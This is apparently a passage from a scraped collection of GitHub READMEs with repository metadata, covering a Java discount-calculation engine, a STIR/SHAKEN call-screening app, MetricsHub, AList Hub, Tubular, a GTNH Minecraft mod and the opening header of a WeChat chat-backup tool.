        if(StringUtils.isNotBlank(path)){
            Reflections reflections = new Reflections(path);
            Set<Class<? extends PreCompute>> subTypes = reflections.getSubTypesOf(PreCompute.class);
            for(Class<? extends PreCompute> clazz:subTypes){
                try {
                    COMPUTES.add(clazz.newInstance());
                } catch (Exception ignore) {
                }
            }
        }
    }
}
```

#### 计算器 Calculator

`Calculator`是单个优惠的计算接口（即用于优惠计算的接口），它其中定义了一个`calcWarp`方法，负责具体的优惠计算逻辑，但由于`calcWarp`需要承担一些内部的事情，需要处理一些内部细节，因此为了简化使用者的开发工作，我们提供了一个抽象类`AbstractCalculator`，它实现了`calcWarp`方法，并最终暴露了一个更简单更直观的`calc`方法供使用者使用。

`AbstractCalculator`的内容如下，在`AbstractCalculator`中，`calcWarp`方法负责创建`CalcStage`对象，维护`CalcStage`数组等内部工作，这些细节对于使用者来说是透明的，他们只需要关注并实现`calc`方法即可。

```Java
public abstract class AbstractCalculator<T extends GoodsItem> implements Calculator<T> {
    public long calcWarp(DiscountContext<T> context, DiscountWrapper discountWrapper, Map<Long, T> records, byte idx, int i) {
        CalcStage stage = new CalcStage();
        CalcResult cr = context.getCalcResult();
        long price= cr.getCurPrice();
        stage.setBeforeCalcPrice(price);
        price = calc(context, discountWrapper,records, price, stage);
        if(price<0){
            return price;
        }
        stage.setAfterCalcPrice(price);
        stage.setIndex(idx);
        stage.setStageType(discountWrapper.getType());
        cr.setCurPrice(price);
        if(stage.getBeforeCalcPrice()>stage.getAfterCalcPrice()) {
            cr.getCurStages()[i] = stage;
        }
        return price;
    }

    /**
     * 返回该优惠下的最终要支付的金额,若不符合则返回 prevStagePrice
     * @param context 上下文
     * @param discountWrapper 优惠信息
     * @param records 记录享受过优惠的单品，key是calculateId，这里只提供容器，添加和判断规则由使用者自行决定
     * @param prevStagePrice 上一步计算的订单的价格
     * @param curStage 当前stage
     * @return
     */
    public abstract  long calc(DiscountContext<T> context, DiscountWrapper discountWrapper, Map<Long,T> records, long prevStagePrice, CalcStage curStage);

}

```
最终用户通过继承`AbstractCalculator`类，并在`Component`注解中指定一个值，而`CalculatorRouter`则通过这个值将请求路由到相应的优惠计算器，这个值与`DiscountWrapper`中的`type`属性相对应。

```Java
@Component(""manjian"")
public class ManjianCalc extends AbstractCalculator<GoodsItem> {
......
}
```


#### 共享互斥协议 DiscountGroup

共享互斥协议是一个数据结构，它是一个数组，数组中最多可以包含两个对象，最少包含一个对象。如果数组中只有一个对象，那么该对象必然为共享组，即组内的优惠可以叠加使用。

```JavaScript
[
    {
        ""relation"": ""share"",
        ""items"":
        [
            {
                ""type"": ""activity0"",
                ""id"": ""11""
            }
            ,
            {
                ""type"": ""activity4"",
                ""id"": ""13""
            } 
            ,
            {
                ""type"": ""coupon1"",
                 ""id"": ""14""
            }
        ]
    }]
```
相应的，当数组中包含两个对象时，第一个对象的`relation`属性可以为`share`或`exclude`，而第二个对象的`relation`属性必须为`exclude`。

```JavaScript
[
    {
        ""relation"": ""share"",
        ""items"":
        [
            {
                ""type"": ""activity0"",
                ""id"": ""11""
            },
            {
                ""type"": ""card3"",
                ""id"":""12""
            }
        ]
    },
    {
        ""relation"": ""exclude"",
        ""items"":
        [
            {
                ""type"": ""card1"",
                ""id"": ""18""
            },
            {
                ""type"": ""coupon1"",
                ""id"": ""22""
            }
        ]
    }
]
```
最终，上述协议将转化为如下两个共享组：

- `activity0-card3-card1` 和 `activity0-card3-coupon1`

工具类 `DiscountGroupUtil` 提供了一个方法，用于将协议转换为共享组。由于共享组可能包含大量优惠，为了提高过滤性能，我们将当前可用的优惠转换为二级`Map`。这个`Map`的外层键是协议中的`type`，而第二层键是协议中的`id`。通过这种方式，我们可以快速地进行交叉过滤，从而提升性能。

```Java
public static List<Pair<Set<DiscountWrapper>,Set<DiscountWrapper>>> transform(List<List<DiscountGroup>> groups, Map<String, Map<String,DiscountWrapper>> inMap);
```
为了确保计算性能，我们将用户在当前订单中可享受的优惠分为两个集合。左侧集合的大小限制为`SUPPORTEDSIZE`，即我们重点保障的、在计算能力范围内的优惠。而右侧集合则尽可能地进行叠加。

从稳定性角度考虑，我们需要对计算次数进行统计。在压力测试中，我们通过`LimitingUtil.count`方法来统计进入`calc`方法的次数。显然，在没有开启缓存的情况下，计算次数为 $A_n^n$×n，而当开启缓存时，计算次数为 $A_n^n$×(n−3)+ $A_n^3$。

#### CASE

看了这么多概念，我们可以在`com.gch.discount.demo`包中找到实际调用的具体case：

```Java
@Controller
public class TestController {

    private final CalculatorRouter calculatorRouter;

    public TestController(CalculatorRouter calculatorRouter) {
        this.calculatorRouter = calculatorRouter;
    }

    @RequestMapping(""test"")
    @ResponseBody
    public Object test() {
        //mock商品
        List<GoodsItem> items = mockItems();
        //mock组关系并转化为共享组
        List<Pair<Set<DiscountWrapper>,Set<DiscountWrapper>>> pairs = transform(mockGroups());
        //全局最优计算过程
        List<CalcStage> globalStages=Lists.newArrayList();
        int count = 0;
        //订单总金额
        long totalPrice = items.stream().mapToLong(GoodsInfo::getSalePrice).sum();
        long globalPrice = totalPrice;
        //构建计算流
        Flowable flowable = (Flowable) new Flowable().build(calculatorRouter);
        for(Pair<Set<DiscountWrapper>,Set<DiscountWrapper>> set:pairs) {
            //统计算力
            count += LimitingUtil.count(set.getLeft().size());
            if(count>N){
                break;
            }
            List<DiscountWrapper> wrappers = Lists.newArrayList(set.getLeft());
            DiscountContext<GoodsItem> ctx = DiscountContext.create(totalPrice, Lists.newArrayList(items), wrappers);
            flowable.perm(ctx);
            if(ctx.getCalcResult().getFinalPrice() < globalPrice) {
                globalStages = Arrays.asList(ctx.getCalcResult().getStages());
                globalPrice = ctx.getCalcResult().getFinalPrice();
            }
        }
        return Pair.of(globalPrice,globalStages);
    }

    private List<List<DiscountGroup>> mockGroups(){
        List<List<DiscountGroup>> groups = Lists.newArrayList();
        DiscountGroup group = new DiscountGroup();
        group.setRelation(GroupRelation.SHARE.getType());
        group.setItems(Lists.newArrayList(new Item(""zhekou"",""1""),new Item(""manjian"",""2""),new Item(""manzeng"",""3"")));
        groups.add(Lists.newArrayList(group));
        return groups;
    }

    private List<GoodsItem> mockItems(){
        IdGenerator idGenerator = IdGenerator.getInstance();
        GoodsInfo goodsInfo = GoodsInfo.of(1001L,2001L,null,4,20 * 100,""产品1"",null);
        GoodsInfo goodsInfo2 = GoodsInfo.of(1001L,2002L,null,2,10 * 100,""产品1"",null);
        List<GoodsItem> items = GoodsItem.generateItems(goodsInfo,idGenerator,x->x.getExtra().put(Constant.UPDATEABLEPRICE,x.getSalePrice()));
        items.addAll(GoodsItem.generateItems(goodsInfo2,idGenerator,x->x.getExtra().put(Constant.UPDATEABLEPRICE,x.getSalePrice())));
        return items;
    }

    private List<Pair<Set<DiscountWrapper>,Set<DiscountWrapper>>> transform(List<List<DiscountGroup>> groups){
        List<DiscountWrapper> wrapperList = Lists.newArrayList(
                DiscountWrapper.of(""zhekou"", ""1"", ""折扣"", false, new DiscountConfig()),
                DiscountWrapper.of(""manjian"", ""2"", ""满减"", false, new DiscountConfig())
        );
        Map<String, Map<String,DiscountWrapper>> inMap = wrapperList.stream().collect(Collectors.toMap(DiscountWrapper::getType, x->ImmutableMap.of(x.getId(),x)));
        return DiscountGroupUtil.transform(groups,inMap);
    }
}

```





",0,0,1,Apache-2.0
iancumes/Estructura-de-Datos,main,,0,0,1,
mkheck/production-ai,main,,0,0,1,
AndroidReverser-Test/bilibiliX,main,"# bilibiliX
下载安装模块安装包，然后在lsposed中启用模块即可。
",4,0,1,Apache-2.0
Divested-Mobile/Carrion,master,"Carrion
==========

Automatically declines all calls failing STIR/SHAKEN verification.

[<img src=""https://fdroid.gitlab.io/artwork/badge/get-it-on.png""
     alt=""Get it on F-Droid""
     height=""80"">](https://f-droid.org/packages/us.spotco.carrion/)
[<img src=""https://hosted.weblate.org/widget/divestos/carrion/287x66-grey.png""
     alt=""Translation status""
     height=""66"">](https://hosted.weblate.org/engage/divestos/)

What?
-----
- Ever receive a spam call and try to call it back, only for it to be out of service or some stranger? This blocks that.
- STIR/SHAKEN provides cryptographic attestation of caller ID and is mandated by law in USA and Canada
- https://www.fcc.gov/call-authentication
- https://en.wikipedia.org/wiki/STIR/SHAKEN
- https://fccprod.servicenowservices.com/rmd?id=rmd_listings

Usage
-----
- Install the app, grant the screening permission, nothing more!
- A call that failed verification will be disallowed and a failure notification shown
- A call that is unsigned will be allowed and a notification shown
  - You can optionally choose to silence or block verification unsigned calls
- A call that is verified will be allowed without any notification
- Calls from contacts or emergency numbers are always allowed

Database Usage
--------------
- For extra coverage and to enable functionality on devices without STIR/SHAKEN there is a local database lookup feature
- Calls from numbers matched in the database will not be declined, but will be silenced
- The archive database contains all numbers reported at least ten times in the past 360 data files
- The high confidence database contains all numbers reported at least twice in the past 90 data files + the archive database
- The ""full"" database contains all numbers reported in the past 30 data files + the high confidence database
- You must manually download the database occasionally
- The database function can be disabled via the `delete database` button
- There is more information about the database here: https://www.ftc.gov/policy-notices/open-government/data-sets/do-not-call-data

Requirements
------------
- VoLTE must be working
- Your device must have official support for Android 11 or higher
- If seemingly all received calls are unknown/unsigned state, your device/carrier is likely incompatible

Notes
-----
- Contacts permission is NOT required/used for exclusion
  - The system itself will not pass calls from contacts to the active Call Screening app
- The robocaller database is entirely optional, STIR/SHAKEN verification is completely independent
- Internet is only optionally used to download the robocaller database
  - Caller information, stats, and other information is never sent anywhere
- The stats feature is entirely local for the user to observe effectiveness and is never sent anywhere
- The archive database is included in both high and full database and cannot be used on its own
- If you want to switch between databases and you just recently updated you must first delete the database
  - This is because the app doesn't know which is actually saved and both databases likely have the same generation timestamp
- The 'Excluded' stat counts outgoing calls to non-contacts, outgoing emergency calls, and all non-contact calls during emergency callback mode
- Your carrier likely already does filter out calls that entirely fail verification
- Your carrier likely does not filter out calls that are unsigned or partially signed

Device Compatibility
--------------------
- The below is not a guarantee, just a minimum requirement
- Pixel 4 and newer
- OnePlus 5 and newer
- Fairphone 3 and newer
- F(x)tec Pro¹ X

Known Issues
------------
- May fail to ask for screening permission, close the app and open until it prompts

Credits
-------
- Icons: Google/Android/AOSP, License: Apache 2.0, https://google.github.io/material-design-icons/

Translations
------------
- Chinese (Simplified): Crit
- Croatian: lukapiplica
- Estonian: Priit Jõerüüt
- Galician: josé m
- German: thereisnoanderson
- French: cwpute
- Indonesian: Adrien N
- Norwegian Bokmål: Even Bull-Tornøe
- Portuguese (Brazil): lucasmz-dev
- Portuguese: ssantos
- Romanian: Renko
- Spanish: vzamanillo, gallegonovato
- Ukrainian: Fqwe1

Donate
-------
- https://divested.dev/donate
",0,2,1,AGPL-3.0
sentrysoftware/metricshub,main,"# MetricsHub

![GitHub release (with filter)](https://img.shields.io/github/v/release/sentrysoftware/metricshub)
![Build](https://img.shields.io/github/actions/workflow/status/sentrysoftware/metricshub/maven-deploy.yml)
![GitHub top language](https://img.shields.io/github/languages/top/sentrysoftware/metricshub)
![License](https://img.shields.io/github/license/sentrysoftware/metricshub)

## Structure

This is a multi-module project:

* **/**: The root (parent of all submodules)
* **metricshub-engine**: The brain, the heart of this project. It houses the core logic and essential functionalities that power the entire system.
* **metricshub-agent**: The MetricsHub Agent module includes a Command-Line Interface (CLI) and is responsible for interacting with the MetricsHub engine. It acts as an entry point, collecting and transmitting data to the OpenTelemetry Collector.
* **metricshub-classloader-agent**: Manages class loading for extensions, ensuring that they are loaded correctly within the JVM.
* **metricshub-ipmi-extension**: Provides support for the Intelligent Platform Management Interface (IPMI) to monitor and manage hardware at the firmware level.
* **metricshub-oscommand-extension**: Allows execution of OS-level commands and scripts to gather metrics and other data from the operating system.
* **metricshub-snmp-extension-common**: Contains common functionalities and utilities used by SNMP-based extensions.
* **metricshub-snmp-extension**: Enables Simple Network Management Protocol (SNMP) for monitoring and managing network devices.
* **metricshub-snmpv3-extension**: Adds support for SNMPv3, which includes enhanced security features like authentication and encryption.
* **metricshub-localsql-source-extension**:  Allows execution of SQL queries on already existing sources.
* **metricshub-win-extension-common**: Contains common functionalities and utilities used by Windows-specific extensions.
* **metricshub-wmi-extension**: Provides support for Windows Management Instrumentation (WMI) to gather detailed information about Windows systems.
* **metricshub-winrm-extension**: Enables the use of Windows Remote Management (WinRM) for remote management and monitoring of Windows-based systems.
* **metricshub-wbem-extension**: Supports the Web-Based Enterprise Management (WBEM) standard for accessing management information.
* **metricshub-ping-extension**: Enables testing the reachability of hosts using ICMP-based ping commands.
* **metricshub-jawk-extension**: Allows execution of Jawk scripts.
* **metricshub-hardware**: Hardware Energy and Sustainability module, dedicated to managing and monitoring hardware-related metrics, focusing on energy consumption and sustainability aspects.
* **metricshub-it-common**: Contains common code and utilities used by integration tests across various modules.
* **metricshub-windows**: Builds the `.zip` package for MetricsHub on Windows platforms.
* **metricshub-linux**: Builds the `.tar.gz` package of MetricsHub on Linux platforms.
* **metricshub-doc**: Houses the documentation for MetricsHub.

> [!TIP]
> Looking for connectors? Check the [MetricsHub Community Connectors](https://github.com/sentrysoftware/metricshub-community-connectors) repository.

## How to build the Project

### Requirements

* Have [Maven 3.x properly installed and configured](https://maven.apache.org/download.cgi).
* Latest LTS Release of [JDK 21](https://adoptium.net).

### Build

To build the MetricsHub package, from `./metricshub`:

```sh
$ mvn clean package
```

#### Building Windows Packages (.zip)

* **Host:** Windows
* Execute the `mvn package` command within the MetricsHub root directory (`metricshub`). You can find the `.zip` package in the `metricshub/metricshub-windows/target` directory upon completion (`metricshub-windows-<version>.zip`).

#### Building Linux Packages (.tar.gz)

* **Host:** Linux
* Execute the `mvn package` command within the MetricsHub root directory (`metricshub`). You can find the `.tar.gz` package in the `metricshub/metricshub-linux/target` directory upon completion (`metricshub-linux-<version>.tar.gz`).
  * The `Docker` package is compatible with the `debian:latest` image, it will be generated under the `metricshub/metricshub-linux/target` directory (`metricshub-linux-<version>-docker.tar.gz`).

## Checkstyle

In this project, we use Checkstyle to ensure consistent and clean Java code across our codebase. 

Maven Checkstyle Plugin is configured globally in the main `pom.xml` file, and it verifies the Java code during the build process:

```xml
	<plugin>
		<artifactId>maven-checkstyle-plugin</artifactId>
		<version>3.3.0</version>
		<configuration>
			<sourceEncoding>${project.build.sourceEncoding}</sourceEncoding>
			<configLocation>checkstyle.xml</configLocation>
		</configuration>
		<executions>
			<execution>
				<id>validate</id>
				<phase>validate</phase>
				<goals>
					<goal>checkstyle</goal>
					<goal>check</goal>
				</goals>
			</execution>
		</executions>
	</plugin>
```

The Checkstyle rules that govern our code quality and style are defined in the `./checkstyle.xml` file. It's important to adhere to these rules to maintain code consistency and quality throughout the project.

The build will fail if one or more Checkstyle rules are violated.

To perform Checkstyle analysis and generate a report on violations, navigate to the directory of the Maven project you wish check and run the following `mvn` command:

```bash
mvn checkstyle:checkstyle
```

All the encountered Checkstyle issues are reported under the `target/site` directory.

To perform Checkstyle analysis and output violations to the console, navigate to the directory of the Maven project you wish check and run the following `mvn` command:

```bash
mvn checkstyle:check
```

## Code Formatting

In this project, we maintain code formatting using [prettier-java](https://github.com/jhipster/prettier-java), a tool that helps ensure clean and consistent Java code. It automatically formats your code according to a predefined set of rules.

### Prettier Maven Plugin

To automatically format the Java code in a specific Maven module, navigate to the directory of the Maven project you wish to format and run the following `mvn` command:

```bash
mvn prettier:write
```

To validate the formatted code, navigate to the directory of the Maven project you wish to check and run the following `mvn` command:

```bash
mvn prettier:check
```

The build will fail if you forgot to run Prettier.

## Submitting a PR

Before you submit a PR, make sure to use the available tools for code formatting, and ensure that the style checks and unit tests pass.

## License

License is GNU Affero General Public License v3.0. Each source file must include the AGPL-3.0 header (build will fail otherwise).
To update source files with the proper header, simply execute the below command:

```bash
mvn license:update-file-header
```

",7,19,15,AGPL-3.0
yuegongzi/alist_hub,main,"# AList Hub

AList Hub是针对小雅AList做的一个封装,更加方便部署、更新和维护

## 功能特点

- 自动签到
- 引导式使用
- 自动更新小雅数据
- 消息推送到手机
- 支持数据监听,并转存
- 支持挂载第三方站点、阿里云盘分享、WebDav和PikPak
- 电影海报
- 系统监控
- AList主题调整
- 自动索引所有数据(小雅数据+自己添加的挂载点)
- 支持搜索

## 界面展示

![image](./assets/1.png)
<br/>
<br/>
![image](./assets/2.png)
<br/>
<br/>
![image](./assets/3.png)
<br/>
<br/>
![image](./assets/4.png)
<br/>
<br/>
![image](./assets/5.png)
<br/>
<br/>
![image](./assets/6.png)

## 开始使用

### 先决条件

系统安装了docker

### 安装

- 方式1:  使用 `docker-compose.yml`

``` yaml

name: alist-hub  
services:
  alist-hub:
    ports:
      - 5244:80
    volumes:
      - ./.alist_data:/opt/alist/data
      - /mnt/nextcloud/alist:/Downloads
    container_name: alist-hub
    image: aetherlib/alist-hub:latest

```

```shell
$ docker-compose up -d
```

- 方式2: 使用`docker`命令

```shell
$ docker run -d \
  --name alist-hub \
  -p 5244:80 \
  -v $(pwd)/.alist_data:/opt/alist/data \
  -v /mnt/nextcloud/alist:/Downloads \
  aetherlib/alist-hub:latest

```

### 配置

- 通过浏览器访问 `http://localhost:5244/@hub/initial` 进入配置页面,根据提示进行配置即可

### 如何使用转存功能

- 安装Aria2
- 在 头像 → 个人设置 → 下载设置 配置好地址和密钥(可选)

### 其他配置说明

- PikPak: 添加账号后会自动装载小雅的PikPak数据
- PushDeer: 自动推送消息到手机(需打开通知) [注册地址](https://www.pushdeer.com/product.html)

## 贡献

说明如何为项目贡献。通常包括：

- Fork 项目
- 创建您的特性分支 (`git checkout -b feature/AmazingFeature`)
- 提交您的更改 (`git commit -m 'Add some AmazingFeature'`)
- 推送到分支 (`git push origin feature/AmazingFeature`)
- 打开一个 Pull Request

## 许可证

该项目根据 MIT 许可证授权。详情请见 [LICENSE](LICENSE) 文件。

## 联系方式

yanganfu2012@gmail.com

## 致谢

- 小雅AList
- AList",0,0,1,MIT
dumbo-the-developer/Duels,master,"<h1>Duels</h1>

[![](https://jitpack.io/v/dumbo-the-developer/Duels.svg)](https://jitpack.io/#dumbo-the-developer/Duels)

---

* **[Wiki](https://github.com/Realizedd/Duels/wiki)**
* **[Commands](https://github.com/Realizedd/Duels/wiki/commands)**
* **[Permissions](https://github.com/Realizedd/Duels/wiki/permissions)**
* **[Placeholders](https://github.com/Realizedd/Duels/wiki/placeholders)**
* **[Extensions](https://github.com/Realizedd/Duels/wiki/extensions)**
* **[config.yml](https://github.com/Realizedd/Duels/blob/master/duels-plugin/src/main/resources/config.yml)**
* **[lang.yml](https://github.com/Realizedd/Duels/blob/master/duels-plugin/src/main/resources/lang.yml)**
* **[Support Discord](https://discord.gg/RNy45sg)**

### Getting the dependency

#### Repository

Gradle:

```groovy
maven {
    name 'jitpack-repo'
    url 'https://jitpack.io'
}
```

Maven:

```xml
<repository>
  <id>jitpack-repo</id>
  <url>https://jitpack.io</url>
</repository>
```

#### Dependency

Gradle:

```groovy
implementation 'com.github.dumbo-the-developer.Duels:duels-api:VERSION'
```  

Maven:

```xml
<dependency>
    <groupId>com.github.dumbo-the-developer.Duels</groupId>
    <artifactId>duels-api</artifactId>
    <version>VERSION</version>
    <scope>provided</scope>
</dependency>
```

### plugin.yml

Add Duels as a soft-depend to ensure Duels is fully loaded before your plugin.

```yaml
soft-depend: [Duels]
```

### Getting the API instance

```java
@Override
public void onEnable() {
  Duels api = (Duels) Bukkit.getServer().getPluginManager().getPlugin(""Duels"");
}
```
",9,6,2,
polymorphicshade/Tubular,master,"<h1 align=""center""><b>Tubular</b></h2>
<h4 align=""center"">A fork of <a href=""https://newpipe.net/"">NewPipe</a> (<a href=""https://github.com/TeamNewPipe/NewPipe/"">Github</a>) that implements <a href=""https://sponsor.ajay.app/"">SponsorBlock</a> (<a href=""https://github.com/ajayyy/SponsorBlock/"">Github</a>) and <a href=""https://www.returnyoutubedislike.com/"">ReturnYouTubeDislike</a> (<a href=""https://github.com/Anarios/return-youtube-dislike/"">Github</a>).</h4>
<p align=""center"">Download the APK <a href=""https://github.com/polymorphicshade/Tubular/releases/latest"">here</a>.</p>
<p align=""center""><img src=""doc/gif/preview_01.gif"" width=""400""></p>

## To Do
Things I'll be working on next (not in any particular order):
- [ ] persist custom SponsorBlock segments in the database
- [ ] add SponsorBlock's ""Exclusive Access"" / ""Sponsored Video feature""
- [ ] add SponsorBlock's chapters feature
- [ ] add a clickbait-remover
- [ ] add keyword/regex filtering
- [ ] add subscription importing with a YouTube login cookie
- [ ] add algorithmic results with a YouTube login cookie
- [ ] add offline YouTube playback

## License
[![GNU GPLv3](https://www.gnu.org/graphics/gplv3-127x51.png)](https://www.gnu.org/licenses/gpl-3.0.en.html)",7,76,3,GPL-3.0
reobf/Programmable-Hatches-Mod,master,"<div align=""center"">
    <h1 align=""center"">
      
可编程仓室模组

Programmable Hatches Mod

[![](https://github.com/reobf/Programmable-Hatches-Mod/actions/workflows/build-and-test.yml/badge.svg)](https://github.com/reobf/Programmable-Hatches-Mod/actions/workflows/build-and-test.yml)
</div>

## 介绍

本项目为GT New Horizons整合包的社区MOD，添加了少许能够帮助游戏玩家更方便完成自动化的单方块机器与多方块结构。

注意，该MOD并非GTNH Mod Pack内的官方MOD，讨论此MOD时请注意场合。

如果在游玩本MOD的过程中遇到BUG或其他问题，请提交issue，必要时请附带复现方式与相关报错log。

## MOD安装须知

### Mod下载与版本

请在Github界面的[Releases](https://github.com/reobf/Programmable-Hatches-Mod/releases)处下载本Mod。

其中你需要注意的是：

本Mod目前单文件适配GTNH整合包 2.6.0 2.6.1版本，2.7.0版本请下载带有gtnh270后缀的版本，不支持GTNH整合包 2.5.0 及以下的版本。

若最新版Mod不能在支持的整合包版本运行,请提issue。

同时，本Mod对2.5.1的支持已经终止，v0.0.18p28是最后一个明确支持2.5.1的版本，尽管在此之后的版本可能可以在2.5.1正常运行，但原则上不再处理仅在2.5.1出现的不兼容问题。

### 关于MOD语言

在游戏安装本Mod后会基于你当前的游戏语言向GregTech.lang文件内写入相应的翻译条目，而写入后将无法自动移除条目。

因此你需要事先设置好你的游戏语言再安装此Mod。

如果在运行过mod之后想更改语言，且启用了UseThisFileAsLanguageFile=true，则你需要删除GregTech.lang，或者恢复安装mod前的GregTech.lang的备份（若有）。

## 内容与特性

### 可编程的仓室

本Mod主要功能为能够让玩家便捷的完成自动化，而GTNH中的虚拟电路板总是让AE接管的自动化变得繁琐。

本Mod为此提供了编程器覆盖板，以及多种电压等级与容量的可编程二合一输入仓，具体功能与GTNH自带的输入总线与总成功能相似，但有以下特性。

#### 可更改电路板设置

<div align=""center"">
  
![pic1](docs/1.png)

`电路覆盖板`

</div>

将编程器覆盖板覆盖至GTNH原版输入总线后，该输入总线将能够识别总线内的编程器电路，并将该总线的虚拟编程电路设置为与编程器电路相同的电路，同时消耗该编程电路。

除了原版输入总线外，GT单方块小机器也能覆盖该覆盖板做到快速更改虚拟电路板的目的。

同时，本Mod所提供的二合一输入仓无需该覆盖板，其自带电路板变更功能。

#### 编程电路的制作

本Mod为各个电压阶段设置了不同的可编程电路制作手段，在一开始，你可以使用锻造锤进行制作编程电路。

<div align=""center"">
  
![pic2](docs/2.png)

`锻造锤制作编程电路`

</div>

除此之外，你可以使用编程器电路提供器方便快捷的合成编程电路，该提供器需要连接至AE网络，并且需要合成处理器才可以使用，合成速度取决于你的合成处理器并行数量。

<div align=""center"">
  
![pic3](docs/3.png)

`电路提供器T1`

</div>

除了T1级别的提供器外，还有更多级别的提供器，同时还有自带模板无需放入物品的预购电路提供器，具体请在NEI内搜索并查看其Tooltips进行了解。

除了电路板外，其他物品例如催化剂等在配方中不被消耗的物品也能制作为编程电路，如果同时需要虚拟电路和催化剂，可以配合本Mod的多电路槽仓室使用。

#### 如何将编程电路编入样板

在编写AE样板时，你可以携带编程工具箱进行样板编写，编程工具箱可以按住Shift + 右键切换模式，其中各个模式的功能如下：

* 模式1：将禁用编程工具箱，此时携带编程工具箱在身上时无法触发任何功能。
* 模式2：将开启不消耗物品自动编入模式，在该模式下，只要你将工具箱放在身上的物品栏内，使用NEI转写配方将把所有不被消耗的物品以编程电路形式编入样板。
* 模式3：与模式2几乎相同，但如果该配方没有需要任何不消耗的物品，那么会生成一个将电路板重置为零的编程电路编入样板。


### 编程二合一输入仓

该输入仓与游戏内的总成作用类似，可以单方块向多方块机器提供配方所需的物品与液体，同时也支持电路编程功能，该输入仓有着多种电压等级版本与升级的缓冲版本。

根据其用途和造价，拥有以下版本的编程二合一输入仓。

* 编程二合一输入仓：没有缓存，只有一个流体输入槽和物品槽的二合一输入仓，电压等级越高，可以输入的物品数量和流体数量越多。

* 编程多流体二合一输入仓：与非多流体的编程二合一输入仓相比，将支持更多种类流体输入，其支持的流体数量取决于电压等级。

* 编程缓冲二合一输入仓：与编程二合一输入仓相比，可以进行物品缓存，多方块机器将优先读取缓存内的物品与流体进行配方合成，同时缓存通常是一次最大输入量的4倍，使用缓冲二合一输入仓有利于充分利用多方块机器的并行。

* 编程缓冲多流体二合一输入仓：与非多流体的缓冲二合一输入仓相比，可以输入多种流体。

* 进阶编程多流体二合一输入仓：与非进阶版本的缓冲多流体二合一输入仓相比，可以存储更多种类的缓存，不同的缓存仓互相隔离，即无法跨配缓存读取物品和流体，使用进阶版本的二合一输入仓有利于解决订单切换导致机器并行无法有效利用问题。

这里我们以Luv级别的进阶编程缓冲多流体输入仓进行演示。

<div align=""center"">
  
![pic4](docs/4.png)

`进阶编程多流体二合一输入仓Luv`

</div>

* 位置1：物品输入界面。

* 位置2：流体输入界面。

其中位置1可存储的物品数量基于电压等级设置，在ME接口向内发送物品时，将不受物品的最大堆叠限制，例如Luv等级的进阶编程缓冲多流体输入仓每格将可堆叠512个物品，EV等级只能堆叠128个物品，

位置2可存储的流体数量设定与位置1相同，但需要注意的是，在非缓冲版本的二合一输入仓只能输入一种流体，而带缓冲的版本随着电压等级的升高可以存储更多种类型的流体，例如Luv缓冲多流体二合一输入仓将可以同时输入5种流体，并且每种流体可以存储64000L，进阶版本的Luv缓冲二合一输入仓流体可输入总数不变，但容量变为512000L.

* 位置3：缓存界面

如果你使用的是带缓冲的二合一输入仓，那么位于位置1与位置2的物品或流体会在1tick后被输送到缓冲，此时多方块结构将优先读取0缓冲位置的物品与流体，缓冲内部将有4倍与外部标识的容量。

需要注意的是，虽然通常玩家会发现缓存内的容量十分巨大，但是处理超大订单时总是出现卡单问题，这是因为外部缓存接受位置的输入量只有缓存内的四分之一，所以编写样板时请注意你的流体数量是否超过了输入仓的最大可接受值，同时注意开启ME接口的阻挡模式，如果不幸发生内部物品乱窜现象，请使用本Mod的ME搋子抽回AE网络。

* 位置4：进阶可编程缓冲二合一输入仓的一些可调整设定

在这里，你可以

>设置是否使用可编程电路模式。
  
>设置是否锁定流体只能存储与位置2中的单格位置，通常情况下，该二合一的流体仓如同GTNH的四重输入仓一样，单种流体在AE发配时无论数量再多，也只能存储在一个格子内部，在二合一输入仓内取消锁定后，单种流体可以在发配时使用多个格子存储。

>设置是否打开输入过滤模式，该设置与普通输入总线的输入过滤模式相同，即该机器的所有配方均无法利用的物品将无法朝内输入。

>输入隔离模式无法被切换。

* 位置5

由于放入缓冲输入面板的物品很快会进入缓存，所以手动放入物品进行合成几乎无法做到，同时你也无法一次性将几组物品放入一个格子里，所以你可以将在5位置处将电源关闭，然后使用插入功能手动向输入面板放置物品，然后再打开电源使物品进入缓存。

#### 其他类型的二合一输入仓

为了解决后期单个配方太大的问题，添加了可以输入超多流体的超级流体二合一输入仓，可以输入10,000,000L*24的流体。

同时还添加了可以使用编程电路的编程样板总线和总成，以及对应的镜像仓室。

除此之外，还有更多功能的特殊仓室请在游戏内搜索。

### 其他实用装置和物品

* ME超级缸/超级箱

与超级缸超级箱功能类似，但是可以直接接入AE网络内，且不需要ME存储总线。

* ME接口覆盖板

与ME接口功能一致，但是能够直接覆盖在机器上，支持二合一和P2P版本。

* 电力原料分配器

解决装配线自动化难题的好办法，具体使用方式游戏内查看tooltips。

* 警告锚

连入AE网络后，AE线缆所在的区块被卸载时将在聊天框内发出警告。

* OC扩展部件

增加了少许Open Computer Mod的使用部件，例如能够访问GT高级无线红石的高级无线红石卡，提供矿典访问与数字和字符串ID转换的API卡等扩展，具体内容请在NEI搜索。

>更多内容请在游戏内探索，如果对于某些内容产生文本理解疑惑，可前去B站进行搜索相关视频教程。

## 兼容性

目前本Mod明确支持GTNH官方版本的所有内容，如果你发现某个仓室无法在某机器上工作，那么该机器本身就不支持总成，除非注入并破坏该机器原本的代码，或者GTNH官方进行修复，不然无法兼容，但是你也还是可以提出相关issue，便于排查问题所在。

同时对于其他社区Mod例如Twist Space Technology Mod的支持可能不全面与不及时，如果你发现与其他Mod发生兼容性问题请提交issue。
",109,13,1,MIT
xuchengsheng/wx-dump-4j,main,"<p align=""center"">
	<a href=""https://wx.xxccss.com/""><img src=""image/logo.png"" width=""45%""></a>
</p>

<p align=""center"">
	<strong>🍬Java版微信聊天记录备份与管理工具</strong>
</p>

<p align=""center"">
	👉 <a href=""https://wx.xxccss.com/"">https://wx.xxccss.com/</a> 👈
</p>

<p align=""center"">
	<a href=""https://hellogithub.com/repository/5055dcceee434dc5851ac9897cb27396"" target=""_blank""><img src=""https://api.hellogithub.com/v1/widgets/recommend.svg?rid=5055dcceee434dc5851ac9897cb27396&claim_uid=AVv4KeNnZs2Ig3a"" alt=""Featured｜HelloGitHub"" style=""width: 250px; height: 54px;"" width=""250"" height=""54"" /></a>
</p>

<p align=""center"">
	<a href=""https://github.com/xuchengsheng/spring-reading/stargazers""><img src=""https://img.shields.io/github/stars/xuchengsheng/wx-dump-4j?logo=github&logoColor=%23EF2D5E&label=Stars&labelColor=%23000000&color=%23EF2D5E&cacheSeconds=3600"" alt=""Stars Badge""/></a>
